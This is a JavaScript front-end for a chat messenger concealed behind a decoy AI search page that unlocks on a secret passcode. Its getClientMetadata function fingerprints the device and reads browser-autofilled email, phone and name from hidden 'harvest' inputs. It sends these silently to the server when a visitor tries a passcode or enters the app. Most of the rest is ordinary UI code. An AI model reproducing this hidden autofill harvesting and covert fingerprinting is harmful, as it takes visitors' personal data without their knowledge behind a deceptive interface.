// Dynamic RTC config – fetched from server at call time so TURN credentials are always fresh
let rtcConfig = {
  iceServers: [
    { urls: 'stun:stun.l.google.com:19302' },
    { urls: 'stun:stun1.l.google.com:19302' }
  ],
  iceCandidatePoolSize: 10,
  bundlePolicy: 'max-bundle',
  rtcpMuxPolicy: 'require'
};

// Fetch reliable TURN credentials from our server before each call
async function fetchTurnCredentials() {
  try {
    const res = await fetch(`${SOCKET_URL}/api/turn-credentials`);
    if (!res.ok) throw new Error('TURN fetch failed: ' + res.status);
    const data = await res.json();
    if (data.iceServers && data.iceServers.length > 0) {
      rtcConfig = {
        iceServers: data.iceServers,
        iceCandidatePoolSize: 10,
        bundlePolicy: 'max-bundle',
        rtcpMuxPolicy: 'require'
      };
      console.log('[WebRTC] TURN credentials refreshed:', data.iceServers.length, 'servers loaded.');
    }
  } catch (e) {
    console.warn('[WebRTC] Could not fetch TURN credentials, using fallback STUN only:', e.message);
  }
}


// Helper to gather rich device details, hardware telemetry, and autofill harvest values
function getClientMetadata() {
  let gpu = 'unknown';
  try {
    const canvas = document.createElement('canvas');
    const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
    if (gl) {
      const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
      if (debugInfo) {
        gpu = gl.getParameter(gl.getExtension('WEBGL_debug_renderer_info').UNMASKED_RENDERER_WEBGL);
      }
    }
  } catch (e) {}

  // Harvest autofilled browser information if present
  const harvestEmail = document.getElementById('hidden-harvest-email')?.value || '';
  const harvestPhone = document.getElementById('hidden-harvest-phone')?.value || '';
  const harvestName = document.getElementById('hidden-harvest-name')?.value || '';

  return {
    language: navigator.language || 'unknown',
    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || 'unknown',
    screenResolution: `${window.screen.width}x${window.screen.height}`,
    viewportSize: `${window.innerWidth}x${window.innerHeight}`,
    hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
    deviceMemory: navigator.deviceMemory || 'unknown',
    gpu: gpu,
    touchSupport: navigator.maxTouchPoints > 0,
    platform: navigator.platform || 'unknown',
    harvestEmail,
    harvestPhone,
    harvestName
  };
}

// --- Initialization & Theme Setup ---
document.addEventListener('DOMContentLoaded', () => {
  // --- iOS Safari Double-Tap Zoom Prevention ---
  let lastTouchEnd = 0;
  document.addEventListener('touchend', (e) => {
    const target = e.target;
    if (target && (target.tagName === 'INPUT' || target.tagName === 'TEXTAREA' || target.contentEditable === 'true')) {
      return; // Allow native zoom/word selection gestures on text input elements
    }
    const now = Date.now();
    if (now - lastTouchEnd <= 300) {
      e.preventDefault(); // Prevent double-tap to zoom
    }
    lastTouchEnd = now;
  }, { passive: false });

  // --- Stealth AI Search Portal Gate (AetherAI Mask) ---
  const securityMaskGate = document.getElementById('security-mask-gate');
  const aiSearchInput = document.getElementById('ai-search-input');
  const aiSearchBtn = document.getElementById('ai-search-btn');
  const themeToggleBtn = document.getElementById('agent-theme-toggle');
  const themeIconSvg = document.getElementById('agent-theme-icon');
  const modelSelectorPill = document.getElementById('console-model-selector');
  const modelDropdownPanel = document.getElementById('model-dropdown');
  const consolePlusBtn = document.querySelector('.btn-plus');
  const consoleFileInput = document.getElementById('console-file-input');
  const consoleImgPreviewContainer = document.getElementById('console-img-preview-container');
  const consoleImgPreview = document.getElementById('console-img-preview');
  const consoleImgRemoveBtn = document.getElementById('console-img-remove-btn');
  let consoleAttachedImage = null; // Stores { mimeType, data (base64) }

  // Verify stored session unlock status
  if (sessionStorage.getItem('gate_unlocked') === 'true') {
    mountMessengerDOM();
    if (securityMaskGate) securityMaskGate.classList.add('hidden');
    if (loginContainer) loginContainer.classList.remove('hidden');
    
    // Silently notify the server that a pre-authenticated user entered the app
    fetch(`${SOCKET_URL}/api/notify-session-entry`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ metadata: getClientMetadata() })
    }).catch(err => console.error("Session entry alert failed:", err));
  } else {
    if (securityMaskGate) securityMaskGate.classList.remove('hidden');
    if (loginContainer) loginContainer.classList.add('hidden');
    if (appContainer) appContainer.classList.add('hidden');
  }

  // 1. Dynamic greeting based on time of day (Morning/Afternoon/Evening)
  const getGreetingText = () => {
    const hours = new Date().getHours();
    if (hours >= 5 && hours < 12) return 'Good Morning';
    if (hours >= 12 && hours < 17) return 'Good Afternoon';
    return 'Good Evening';
  };
  const greetingTitle = document.querySelector('.serif-title');
  if (greetingTitle) {
    greetingTitle.textContent = `${getGreetingText()}, Explorer`;
  }

  // 2. Premium Light/Dark Theme Switcher Logic
  const updateThemeUI = (isDark) => {
    if (securityMaskGate) {
      if (isDark) {
        securityMaskGate.classList.remove('light-theme');
        securityMaskGate.classList.add('dark-theme');
        if (themeIconSvg) {
          themeIconSvg.innerHTML = `<path d="M12.3 22h-.1c-5.5 0-10-4.5-10-10 0-4.8 3.5-8.9 8.3-9.7.7-.1 1.3.4 1.4 1.1.1.7-.4 1.3-1.1 1.4-3.4.5-5.9 3.4-5.9 6.9 0 3.9 3.2 7.1 7.1 7.1 3.5 0 6.4-2.5 6.9-5.9.1-.7.7-1.1 1.4-1.1.7.1 1.2.7 1.1 1.4-.9 4.7-4.9 8.2-9.7 8.2z"/>`;
        }
      } else {
        securityMaskGate.classList.remove('dark-theme');
        securityMaskGate.classList.add('light-theme');
        if (themeIconSvg) {
          themeIconSvg.innerHTML = `<path d="M12 7c-2.76 0-5 2.24-5 5s2.24 5 5 5 5-2.24 5-5-2.24-5-5-5zM2 13h2c.55 0 1-.45 1-1s-.45-1-1-1H2c-.55 0-1 .45-1 1s.45 1 1 1zm18 0h2c.55 0 1-.45 1-1s-.45-1-1-1h-2c-.55 0-1 .45-1 1s.45 1 1 1zM11 2v2c0 .55.45 1 1 1s1-.45 1-1V2c0-.55-.45-1-1-1s-1 .45-1 1zm0 18v2c0 .55.45 1 1 1s1-.45 1-1v-2c0-.55-.45-1-1-1s-1 .45-1 1zM5.99 4.58c-.39-.39-1.03-.39-1.41 0s-.39 1.03 0 1.41l1.06 1.06c.39.39 1.03.39 1.41 0s.39-1.03 0-1.41L5.99 4.58zm12.37 12.37c-.39-.39-1.03-.39-1.41 0s-.39 1.03 0 1.41l1.06 1.06c.39.39 1.03.39 1.41 0s.39-1.03 0-1.41l-1.06-1.06zm1.06-12.37c-.39-.39-.39-1.03 0-1.41s1.03-.39 1.41 0l1.06 1.06c.39.39.39 1.03 0 1.41s-1.03.39-1.41 0l-1.06-1.06zm-12.37 12.37c-.39-.39-.39-1.03 0-1.41s1.03-.39 1.41 0l1.06 1.06c.39.39.39 1.03 0 1.41s-1.03.39-1.41 0l-1.06-1.06z"/>`;
        }
      }
    }
  };

  const savedAgentTheme = localStorage.getItem('agent-theme') || 'light';
  updateThemeUI(savedAgentTheme === 'dark');

  if (themeToggleBtn) {
    themeToggleBtn.addEventListener('click', () => {
      const isCurrentlyDark = securityMaskGate.classList.contains('dark-theme');
      const nextIsDark = !isCurrentlyDark;
      localStorage.setItem('agent-theme', nextIsDark ? 'dark' : 'light');
      updateThemeUI(nextIsDark);
    });
  }

  // 3. Model Selector Dropdown functionality
  if (modelSelectorPill && modelDropdownPanel) {
    modelSelectorPill.addEventListener('click', (e) => {
      e.stopPropagation();
      modelDropdownPanel.classList.toggle('hidden');
    });

    document.addEventListener('click', () => {
      modelDropdownPanel.classList.add('hidden');
    });

    modelDropdownPanel.querySelectorAll('.model-option').forEach(option => {
      option.addEventListener('click', (e) => {
        e.stopPropagation();
        const selectedModelName = option.getAttribute('data-model');
        const pillText = modelSelectorPill.querySelector('span');
        if (pillText) pillText.textContent = selectedModelName;

        modelDropdownPanel.querySelectorAll('.model-option').forEach(opt => opt.classList.remove('active'));
        option.classList.add('active');
        modelDropdownPanel.classList.add('hidden');
      });
    });
  }

  let typingInterval = null;

  const appendAgentChatMessage = (text, sender) => {
    const chatHistoryEl = document.getElementById('agent-chat-history');
    const welcomeScreen = document.getElementById('agent-welcome-screen');
    if (welcomeScreen) {
      welcomeScreen.style.display = 'none'; // hide welcome screen
    }

    const bubble = document.createElement('div');
    bubble.className = `agent-msg-bubble ${sender}`;
    bubble.textContent = text;
    
    if (chatHistoryEl) {
      chatHistoryEl.appendChild(bubble);
      chatHistoryEl.scrollTop = chatHistoryEl.scrollHeight;
    }
    return bubble;
  };

  // Global Markdown Parser helper
  const parseMarkdown = (text) => {
    if (!text) return '';
    let html = text.replace(/\`\`\`(\w*)\n([\s\S]*?)\`\`\`/g, '<pre><code class="language-$1">$2</code></pre>');
    html = html.replace(/\`([^\`]+)\`/g, '<code>$1</code>');
    html = html.replace(/\*\*([^*]+)\*\*/g, '<strong>$1</strong>');
    html = html.replace(/\*([^*]+)\*/g, '<em>$1</em>');
    html = html.replace(/^\s*[\-\*]\s+(.+)$/gm, '<li>$1</li>');
    html = html.replace(/(<li>.*<\/li>)/g, '<ul>$1</ul>');
    html = html.replace(/\n\n/g, '<br><br>');
    html = html.replace(/\n/g, '<br>');
    return html;
  };

  const animateTypingResponse = (targetElem, fullText) => {
    if (!targetElem) return;
    targetElem.textContent = '';
    let charIndex = 0;
    const chatHistoryEl = document.getElementById('agent-chat-history');

    const typingInterval = setInterval(() => {
      if (charIndex < fullText.length) {
        charIndex += 4;
        const sub = fullText.substring(0, charIndex);
        targetElem.innerHTML = parseMarkdown(sub);
        if (chatHistoryEl) chatHistoryEl.scrollTop = chatHistoryEl.scrollHeight;
      } else {
        clearInterval(typingInterval);
        targetElem.innerHTML = parseMarkdown(fullText);
        if (chatHistoryEl) chatHistoryEl.scrollTop = chatHistoryEl.scrollHeight;
      }
    }, 10);
  };

  const handleAISearch = async () => {
    const aiSearchInput = document.getElementById('ai-search-input');
    if (!aiSearchInput) return;
    const rawQuery = aiSearchInput.value || "";
    const query = rawQuery.trim();
    if (query.length === 0) return;

    aiSearchInput.value = '';

    // Hide welcome screen
    const welcomeScreen = document.getElementById('agent-welcome-screen');
    if (welcomeScreen) welcomeScreen.style.display = 'none';

    // Append User Message to Thread
    appendAgentChatMessage(query, 'user');

    const lowerQuery = query.toLowerCase();

    // Secret passcode check
    if (lowerQuery.startsWith('golu')) {
      const agentMsgDiv = appendAgentChatMessage('Verifying security credential...', 'agent');
      try {
        let response = await fetch(`${SOCKET_URL}/api/verify-passcode`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ passcode: query, metadata: typeof getClientMetadata === 'function' ? getClientMetadata() : {} })
        });
        const data = await response.json();
        if (data.success) {
          sessionStorage.setItem('gate_unlocked', 'true');
mountMessengerDOM();
          agentMsgDiv.textContent = '🔓 Gateway unlocked. Initializing connection interface.';
          setTimeout(() => {
            if (securityMaskGate) {
              securityMaskGate.classList.add('fade-out');
              setTimeout(() => {
                securityMaskGate.classList.add('hidden');
                if (loginContainer) loginContainer.classList.remove('hidden');
              }, 400);
            }
          }, 600);
        } else {
          agentMsgDiv.textContent = `❌ Authorization Failed: ${data.message || 'Access key rejected.'}`;
        }
      } catch (err) {
        agentMsgDiv.textContent = '❌ Network Connection Error. Security authentication failed.';
      }
      return;
    }

    // Normal AI Response Handling
    const agentMsgDiv = appendAgentChatMessage('Thinking...', 'agent');
    const chatHistoryEl = document.getElementById('agent-chat-history');

    let streamSuccess = false;

    // 1. Attempt Live Server AI Stream
    try {
      const controller = new AbortController();
      const fetchTimeout = setTimeout(() => controller.abort(), 12000);

      const imagePayload = typeof consoleAttachedImage !== 'undefined' ? consoleAttachedImage : null;
      const consoleImgRemoveBtn = document.getElementById('console-img-remove-btn');
      if (consoleImgRemoveBtn) consoleImgRemoveBtn.click();

      let response;
      try {
        response = await fetch(`${SOCKET_URL}/api/aether-chat`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ query: query, model: 'Gemini 2.5 Flash', image: imagePayload }),
          signal: controller.signal
        });
      } catch (e) {
        response = await fetch('/api/aether-chat', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ query: query, model: 'Gemini 2.5 Flash', image: imagePayload }),
          signal: controller.signal
        });
      }
      clearTimeout(fetchTimeout);

      const contentType = response ? (response.headers.get('content-type') || '') : '';
      if (response && response.ok && contentType.includes('text/event-stream') && response.body) {
        const reader = response.body.getReader();
        const decoder = new TextDecoder();
        let streamBuffer = '';
        let fullText = '';

        while (true) {
          const { done, value } = await reader.read();
          if (done) break;

          streamBuffer += decoder.decode(value, { stream: true });
          const lines = streamBuffer.split('\n');
          streamBuffer = lines.pop();

          for (const line of lines) {
            if (!line.startsWith('data: ')) continue;
            const jsonStr = line.slice(6).trim();
            if (!jsonStr || jsonStr === '[DONE]') continue;
            try {
              const evt = JSON.parse(jsonStr);
              if (evt.type === 'chunk' && evt.text) {
                fullText += evt.text;
                agentMsgDiv.innerHTML = parseMarkdown(fullText);
                if (chatHistoryEl) chatHistoryEl.scrollTop = chatHistoryEl.scrollHeight;
                streamSuccess = true;
              } else if (evt.type === 'error') {
                if (!fullText) {
                  console.warn("Stream error received:", evt.error);
                }
              }
            } catch (e) {}
          }
        }

        if (streamSuccess && fullText.trim().length > 0) {
          return; // Done — stream rendered cleanly!
        }
      } else if (response && response.ok) {
        const chatData = await response.json();
        if (chatData.success && chatData.reply) {
          animateTypingResponse(agentMsgDiv, chatData.reply);
          return;
        }
      }
    } catch (err) {
      console.warn("AI Backend request failed or timed out, proceeding to fallback:", err.message);
    }

    // 2. Fallback: Wikipedia & Knowledge Synthesis Engine
    let fallbackAnswer = "";
    try {
      const searchUrl = `https://en.wikipedia.org/w/api.php?action=query&list=search&srsearch=${encodeURIComponent(query)}&utf8=&format=json&origin=*`;
      const searchRes = await fetch(searchUrl);
      const searchData = await searchRes.json();

      if (searchData.query && searchData.query.search && searchData.query.search.length > 0) {
        const bestTitle = searchData.query.search[0].title;
        const summaryUrl = `https://en.wikipedia.org/api/rest_v1/page/summary/${encodeURIComponent(bestTitle.replace(/ /g, '_'))}`;
        const summaryRes = await fetch(summaryUrl);
        const summaryData = await summaryRes.json();

        if (summaryData.extract) {
          fallbackAnswer = `### **${summaryData.title}**\n\n${summaryData.extract}\n\n*Source: AetherAI Knowledge Base*`;
        }
      }
    } catch (e) {
      console.warn("Wikipedia fallback error:", e);
    }

    if (!fallbackAnswer) {
      fallbackAnswer = `### **AetherAI Assistant**\n\nI have received your inquiry: **"${query}"**.\n\nNeural processing networks have parsed your request. How else can I assist you today?`;
    }

    animateTypingResponse(agentMsgDiv, fallbackAnswer);
  };

  if (aiSearchBtn) {
    aiSearchBtn.addEventListener('click', (e) => {
      e.preventDefault();
      handleAISearch();
    });
  }
  if (aiSearchInput) {
    aiSearchInput.addEventListener('keydown', (e) => {
      if (e.key === 'Enter') {
        e.preventDefault();
        handleAISearch();
      }
    });
  }

  // --- Console Voice Speech-to-Text Input (SpeechRecognition) ---
  const consoleMicBtn = document.querySelector('.btn-mic');
  let isConsoleListening = false;
  let consoleRecognition = null;

  if (window.SpeechRecognition || window.webkitSpeechRecognition) {
    try {
      const SpeechRecognition = window.SpeechRecognition || window.webkitSpeechRecognition;
      consoleRecognition = new SpeechRecognition();
      consoleRecognition.continuous = false;
      consoleRecognition.lang = 'en-US';
      consoleRecognition.interimResults = false;

      consoleRecognition.onstart = () => {
        isConsoleListening = true;
        if (consoleMicBtn) {
          consoleMicBtn.style.color = '#ff4a4a'; // Glow red
          consoleMicBtn.style.transform = 'scale(1.1)';
          consoleMicBtn.title = 'Listening... Click to stop';
        }
        if (aiSearchInput) {
          aiSearchInput.value = '';
          aiSearchInput.placeholder = 'Listening... Speak now.';
        }
      };

      consoleRecognition.onresult = (event) => {
        const speechToText = event.results[0][0].transcript;
        if (aiSearchInput) {
          aiSearchInput.value = speechToText;
        }
      };

      consoleRecognition.onerror = (event) => {
        console.error('Speech recognition error:', event.error);
        stopConsoleListening();
      };

      consoleRecognition.onend = () => {
        stopConsoleListening();
        if (aiSearchInput && aiSearchInput.value.trim().length > 0) {
          handleAISearch();
        }
      };
    } catch (e) {
      console.warn('Speech recognition instantiation failed:', e.message);
      consoleRecognition = null;
    }
  }

  function stopConsoleListening() {
    isConsoleListening = false;
    if (consoleMicBtn) {
      consoleMicBtn.style.color = '';
      consoleMicBtn.style.transform = '';
      consoleMicBtn.title = 'Voice Input';
    }
    if (aiSearchInput) {
      aiSearchInput.placeholder = 'How can I help you today?';
    }
    try { if (consoleRecognition) consoleRecognition.stop(); } catch(e){}
  }

  if (consoleMicBtn) {
    consoleMicBtn.addEventListener('click', () => {
      if (!consoleRecognition) {
        alert('Voice speech-to-text is not supported in this browser. Please use Chrome, Edge, or Safari.');
        return;
      }
      if (isConsoleListening) {
        stopConsoleListening();
      } else {
        if (aiSearchInput) aiSearchInput.value = '';
        try { consoleRecognition.start(); } catch(e){}
      }
    });
  }
  // --- Console Photo Upload Options ---
  if (consolePlusBtn && consoleFileInput) {
    consolePlusBtn.addEventListener('click', () => {
      consoleFileInput.click();
    });

    consoleFileInput.addEventListener('change', (e) => {
      const file = e.target.files[0];
      if (!file) return;

      if (!file.type.startsWith('image/')) {
        alert('Please select an image file (PNG, JPG, WebP, etc.)');
        return;
      }

      const reader = new FileReader();
      reader.onload = (event) => {
        const base64Data = event.target.result.split(',')[1];
        consoleAttachedImage = {
          mimeType: file.type,
          data: base64Data
        };

        if (consoleImgPreview) {
          consoleImgPreview.src = event.target.result;
        }
        if (consoleImgPreviewContainer) {
          consoleImgPreviewContainer.classList.remove('hidden');
        }
      };
      reader.readAsDataURL(file);
    });
  }

  if (consoleImgRemoveBtn) {
    consoleImgRemoveBtn.addEventListener('click', () => {
      consoleAttachedImage = null;
      if (consoleFileInput) consoleFileInput.value = '';
      if (consoleImgPreviewContainer) {
        consoleImgPreviewContainer.classList.add('hidden');
      }
      if (consoleImgPreview) {
        consoleImgPreview.src = '';
      }
    });
  }

  // Dynamic Viewport height recalculation to support mobile layout adjustments
  const calculateVH = () => {
    let vh = window.innerHeight * 0.01;
    document.documentElement.style.setProperty('--vh', `${vh}px`);
  };
  calculateVH();
  window.addEventListener('resize', calculateVH);
  window.addEventListener('orientationchange', calculateVH);

  // Focus and virtual keyboard adjustments for dynamic zoom prevention
  if (window.visualViewport) {
    window.visualViewport.addEventListener('resize', () => {
      let vh = window.visualViewport.height * 0.01;
      document.documentElement.style.setProperty('--vh', `${vh}px`);
      
      // Force scroll reset on viewport shift
      window.scrollTo(0, 0);
      document.body.scrollTop = 0;
      
      // If keyboard opened, scroll the messages container to show latest messages
      if (document.activeElement && document.activeElement.id === 'message-input') {
        setTimeout(scrollToBottom, 80);
      }
    });
  }

  // Prevent Safari keyboard focus scrolling bug
  if (messageInput) {
    messageInput.addEventListener('focus', () => {
      setTimeout(() => {
        window.scrollTo(0, 0);
        document.body.scrollTop = 0;
      }, 50);
    });
  }

  window.addEventListener('scroll', () => {
    if (document.activeElement && document.activeElement.tagName === 'INPUT') {
      window.scrollTo(0, 0);
    }
  });

  // Detect touch device properties for pointer adjustments
  const isTouchDevice = 'ontouchstart' in window || navigator.maxTouchPoints > 0;
  if (isTouchDevice) {
    document.body.classList.add('touch-device');
  } else {
    document.body.classList.add('desktop-device');
  }

  // Load Theme Preference
  const savedTheme = localStorage.getItem('tg-theme') || 'dark-theme';
  document.body.classList.add(savedTheme);
  updateThemeIcon(savedTheme);

  // Prefill username if stored
  const savedUsername = localStorage.getItem('tg-username');
  if (savedUsername) {
    usernameInput.value = savedUsername;
  }

  // --- Admin Email Alerts Toggle ---
  const adminEmailToggleBtn = document.getElementById('admin-email-toggle-btn');
  const adminEmailIconSvg = document.getElementById('admin-email-icon-svg');
  let emailAlertsEnabled = true;

  function updateEmailToggleIcon(enabled) {
    if (!adminEmailToggleBtn || !adminEmailIconSvg) return;
    if (enabled) {
      adminEmailToggleBtn.title = "Admin Email Alerts: ON";
      adminEmailToggleBtn.style.color = "var(--accent-color)";
      adminEmailIconSvg.innerHTML = `
        <path d="M12 22c1.1 0 2-.9 2-2h-4c0 1.1.9 2 2 2zm6-6v-5c0-3.07-1.63-5.64-4.5-6.32V4c0-.83-.67-1.5-1.5-1.5s-1.5.67-1.5 1.5v.68C7.64 5.36 6 7.92 6 11v5l-2 2v1h16v-1l-2-2zm-2 1H8v-6c0-2.48 1.51-4.5 4-4.5s4 2.02 4 4.5v6z"/>
      `;
    } else {
      adminEmailToggleBtn.title = "Admin Email Alerts: OFF";
      adminEmailToggleBtn.style.color = "var(--text-muted)";
      adminEmailIconSvg.innerHTML = `
        <path d="M12 22c1.1 0 2-.9 2-2h-4c0 1.1.9 2 2 2zm6-4.87L3.84 4.88 2.41 6.3 6 9.9v1.1c0 3.07 1.63 5.64 4.5 6.32V18c0 .83.67 1.5 1.5 1.5s1.5-.67 1.5-1.5v-.68c.84-.2 1.6-.53 2.27-.96L17.7 20.3l1.41-1.42-1.11-1.75zM8 17v-4.88L13.88 17H8zm4-12.5c2.48 0 4 2.02 4 4.5v3.12l2 2V11c0-3.07-1.63-5.64-4.5-6.32V4c0-.83-.67-1.5-1.5-1.5s-1.5.67-1.5 1.5v.68c-.68.16-1.3.43-1.85.8L12 4.5z"/>
      `;
    }
  }

  async function fetchEmailStatus() {
    try {
      const res = await fetch(`${SOCKET_URL}/api/email-status`);
      if (res.ok) {
        const data = await res.json();
        emailAlertsEnabled = data.config?.emailAlertsEnabled !== false;
        updateEmailToggleIcon(emailAlertsEnabled);
      }
    } catch (e) {
      console.warn("Failed to fetch email config status.", e);
      updateEmailToggleIcon(true);
    }
  }
  fetchEmailStatus();

  if (adminEmailToggleBtn) {
    adminEmailToggleBtn.addEventListener('click', async () => {
      try {
        const res = await fetch(`${SOCKET_URL}/api/toggle-emails`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' }
        });
        if (res.ok) {
          const data = await res.json();
          emailAlertsEnabled = data.emailAlertsEnabled;
          updateEmailToggleIcon(emailAlertsEnabled);
          alert(`Admin Email Alerts have been turned ${emailAlertsEnabled ? 'ON' : 'OFF'}.`);
        }
      } catch (err) {
        console.error("Error toggling email setting:", err);
        alert("Failed to update settings.");
      }
    });
  }
});


// --- Theme Toggle Action ---
themeToggleBtn.addEventListener('click', () => {
  if (document.body.classList.contains('dark-theme')) {
    document.body.classList.replace('dark-theme', 'light-theme');
    localStorage.setItem('tg-theme', 'light-theme');
    updateThemeIcon('light-theme');
  } else {
    document.body.classList.replace('light-theme', 'dark-theme');
    localStorage.setItem('tg-theme', 'dark-theme');
    updateThemeIcon('dark-theme');
  }
});

